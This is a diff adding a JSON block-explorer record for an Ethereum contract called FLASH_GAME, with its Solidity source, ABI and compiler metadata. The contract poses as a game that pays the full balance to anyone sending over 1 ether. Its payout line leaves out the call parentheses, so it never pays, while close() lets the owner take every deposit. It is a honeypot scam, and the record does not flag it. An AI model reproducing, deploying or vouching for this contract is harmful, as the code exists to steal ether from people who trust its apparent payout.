@@ -1,0 +1,25 @@
+{
+  "TxHash": "0x46449d9092494e05df03953df56fc167aff5edb073d883f43cf33fe62251347b",
+  "ContractAddress": "0x212639b2e80218a85d15925EA7e6B74c122C2255",
+  "Name": "FLASH_GAME",
+  "PackageStatus": 0,
+  "status": "1",
+  "message": "OK",
+  "result": [
+    {
+      "SourceCode": "contract FLASH_GAME {\r\n    function multiplicate() public payable {\r\n        if (msg.value \u003e 1 ether) {\r\n            msg.sender.call.value(address(this).balance);\r\n        }\r\n    }\r\n\r\n    address public owner = msg.sender;\r\n\r\n    function close() external payable {\r\n        require(msg.sender == owner);\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n    function() external payable {\r\n        multiplicate();\r\n    }\r\n\r\n    constructor() public payable {}\r\n}",
+      "ABI": "[{\"constant\":false,\"inputs\":[],\"name\":\"close\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"multiplicate\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]",
+      "ContractName": "FLASH_GAME",
+      "CompilerVersion": "v0.4.26+commit.4563c3fc",
+      "OptimizationUsed": "1",
+      "Runs": "200",
+      "ConstructorArguments": "",
+      "EVMVersion": "Default",
+      "Library": "",
+      "LicenseType": "GNU GPLv3",
+      "Proxy": "0",
+      "Implementation": "",
+      "SwarmSource": "bzzr://b068bb92c6976561800c80926527910319fb34f670015d9a221077e5d2c42fff"
+    }
+  ]
+}
